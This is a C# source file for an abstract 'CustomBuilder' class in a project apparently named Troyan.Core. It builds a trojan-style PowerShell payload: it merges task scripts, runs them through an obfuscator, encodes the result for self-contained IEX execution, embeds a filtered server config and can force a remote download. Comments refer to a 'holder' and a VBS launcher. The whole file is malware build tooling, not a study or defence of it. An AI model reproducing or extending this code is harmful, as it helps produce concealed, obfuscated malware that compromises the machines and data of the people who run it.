using System.Diagnostics.CodeAnalysis;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using Commons;
using model;

namespace Troyan.Core;

[SuppressMessage("ReSharper", "MemberCanBePrivate.Global")]
public abstract partial class CustomBuilder
{
    private readonly IPowerShellObfuscator _obfuscator;

    protected CustomBuilder(TroyanBuildMode mode, IPowerShellObfuscator obfuscator)
    {
        Mode = mode;
        _obfuscator = obfuscator;
    }

    public TroyanBuildMode Mode { get; }

    protected IPowerShellObfuscator Obfuscator => _obfuscator;

    protected abstract string SourceDir { get; }

    protected abstract string OutputFile { get; }

    protected abstract string EntryPoint { get; }
    protected abstract string[] PriorityTasks { get; }
    protected abstract string[] UnpriorityTasks { get; }

    /// <summary>False for thin holder: only entrypoint payload, no merged <c>program.ps1</c> Main/task table.</summary>
    protected virtual bool AppendProgramLauncherTail => true;

    /// <summary>When true, <c>. ./x.ps1</c> lines are kept and dependencies are deployed as real files next to the body (see output <c>troyanps</c> copy). Release builds keep false so gzip/IEX payloads stay self-contained.</summary>
    protected virtual bool PreserveDotSourceLinks => false;

    private ServerService _serverService = null!;
    private ServerLayoutPaths _layout = null!;

    protected ServerLayoutPaths L => _layout;

    protected ServerModel Model = new();
    protected PackItem? PackItem = null;
    private List<SourceFile> SourceFiles = new();
    private List<SourceFile> DoFiles => SourceFiles
        .Where(a => a.IsDo == true).ToList();
    private List<SourceFile> NonDoFiles => SourceFiles
        .Where(a => a.IsDo == false).ToList();


    private readonly StringBuilder Builder = new();
    protected readonly List<string> Result = new();

    public virtual List<string> Build(string server, string packId, ServerService serverService)
    {
        _serverService = serverService;
        _layout = serverService.Layout();
        var srv = serverService.GetServerLite();
        Model = srv;
        if (!string.IsNullOrWhiteSpace(packId))
            PackItem = Model.Pack.Items.FirstOrDefault(a => a.Id == packId);
        MakeConsts();
        InternalBuild(server);
        SourceFiles = GetSourceFiles();
        CompileSources();
        var directoryPath = Path.GetDirectoryName(OutputFile);
        if (!string.IsNullOrEmpty(directoryPath) && !Directory.Exists(directoryPath))
            Directory.CreateDirectory(directoryPath);

        ComposeScript();
        CopyTroyanScriptPackToOutput();

        if (Mode == TroyanBuildMode.Release)
            GeneratePowerShellScript(OutputFile, OutputFile, true);

        PostBuild();

        return Result;
    }

    protected virtual void PostBuild()
    {
    }

    private void MakeConsts()
    {
        var template = @"
$server = @'
_SERVER
'@ | ConvertFrom-Json
";

        var keywords = new List<string>
        {
            "Dir", "holder", "body", "operation", "troyan", "clone", "pack", "post", "dnSponsor", "ftp", "user",
            "alias", "_operate", "StatusLabel",
            "login", "password", "ico", "domainController",
            "interfaces", "bux", "landing", "php", "domainIp"
        };

        var tempFile = Path.GetTempFileName();
        File.Copy(L.UserServerFile, tempFile, true);
        if (PackItem != null)
        {
            var m = _serverService.Loader.LoadFileInternal(tempFile);
            m.PanelHomeDirectory = _serverService.Paths.UserDataDir;
            m.Refresh();
            m.StartDownloadsForce = true;
            m.StartDownloads = new List<string>() { PackItem.OriginalUrl };
            _serverService.Loader.SaveFile(tempFile, m);
        }

        var serverFilePath = tempFile;
        var serverJson = File.ReadAllText(serverFilePath);
        var server = JsonNode.Parse(serverJson)!;



        JsonNode FilterObjectByKeywords(JsonNode serverObject, List<string> filterKeywords)
        {
            var filteredDictionary = serverObject.AsObject()
                .Where(kvp => !filterKeywords.Any(a => kvp.Key.ToLower().ToLower().Contains(a.ToLower())))
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

            return JsonNode.Parse(JsonSerializer.Serialize(filteredDictionary))!;
        }

        var filteredObject = FilterObjectByKeywords(server, keywords);
        var serverJsonString = JsonSerializer.Serialize(filteredObject, new JsonSerializerOptions { WriteIndented = true });
        template = template.Replace("_SERVER", serverJsonString);

        var outputPath = Path.Combine(L.TroyanScriptDir, "consts_body.ps1");
        File.WriteAllText(outputPath, template);
    }

    /// <summary>Deploy sibling <c>troyanps</c> next to <c>_output</c> so plain VBS + debug body can resolve <c>. ./</c> imports (and panel publish can mirror the tree).</summary>
    private void CopyTroyanScriptPackToOutput()
    {
        var destDir = Path.Combine(L.TroyanOutputDir, "troyanps");
        Directory.CreateDirectory(destDir);
        foreach (var src in Directory.EnumerateFiles(L.TroyanScriptDir, "*.ps1", SearchOption.TopDirectoryOnly))
        {
            var name = Path.GetFileName(src);
            File.Copy(src, Path.Combine(destDir, name), overwrite: true);
        }
    }

    private void ComposeScript()
    {
        foreach (var x in SourceFiles.Where(a => a.Name == EntryPoint))
        {
            Builder.Append(x.Data);
            Builder.AppendLine();
        }
        Builder.AppendLine("");

        var psString = new StringBuilder();
        var taskKeyOrder = new StringBuilder();
        for (var i = 0; i < DoFiles.Count; i++)
        {
            var kvp = DoFiles[i];
            var renamed = new Dictionary<string, string>();

            var key = kvp.Name;
            var renamedKey = key;

            // Windows PowerShell 5.1: trailing comma before closing ) in @( ) is a parse error ("Missing expression after ','").
            var comma = i < DoFiles.Count - 1 ? "," : "";
            taskKeyOrder.AppendLine($"        \"{renamedKey}\"{comma}");
            psString.AppendLine($"    \"{renamedKey}\" = \"{kvp.TaskTablePayload(renamed)}\"");
        }

        var doo = psString.ToString();
        var taskOrder = taskKeyOrder.ToString();

        var dataProd = Builder.ToString();
        if (AppendProgramLauncherTail)
        {
            var programRaw = ReadSource("program");
            (var head, var body) = ExtractHeadAndBody(programRaw.Data);
            body = body.Replace("###taskKeyOrder", taskOrder);
            body = body.Replace("###doo", doo);
            dataProd = head + Environment.NewLine + dataProd + Environment.NewLine + body;
        }
        File.WriteAllText(OutputFile, dataProd);
    }

    protected abstract void InternalBuild(string server);

    private void CompileSources()
    {
        for (var i = 0; i < SourceFiles.Count; i++)
        {
            var sourceFile = SourceFiles[i];
            sourceFile = ReadSource(sourceFile.Name);
            SourceFiles[i] = sourceFile;
        }
    }

    static (string Head, string Body) ExtractHeadAndBody(string input)
    {
        var lines = input.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);

        var head = new StringBuilder();
        var body = new StringBuilder();

        var headBegin = false;
        var headEnd = false;

        foreach (var line in lines)
        {
            if (line.Trim() == "###head")
            {
                if (!headBegin)
                {
                    headBegin = true;
                }
                else
                {
                    if (!headEnd)
                    {
                        headEnd = true;
                    }
                }
            }

            if (!headBegin || (headBegin && !headEnd))
            {
                head.AppendLine(line);
            }
            else
            {
                body.AppendLine(line);
            }
        }

        return (head.ToString().Trim(), body.ToString().Trim());
    }

    public string GeneratePowerShellScript(string powerShellCode, bool attachEncoded)
    {
        var encoded = CustomCryptor.Encode(powerShellCode);
        var script = ReadSource("dynamic").Data;
        if (!attachEncoded)
            return script;
        var data = $"$EncodedScript = \"{encoded}\"" + Environment.NewLine + script;
        return data;
    }


    public void GeneratePowerShellScript(string inFile, string outFile, bool attachEncoded)
    {
        var data = File.ReadAllText(inFile);
        data = GeneratePowerShellScript(data, attachEncoded);
        File.WriteAllText(outFile, data);
    }
}
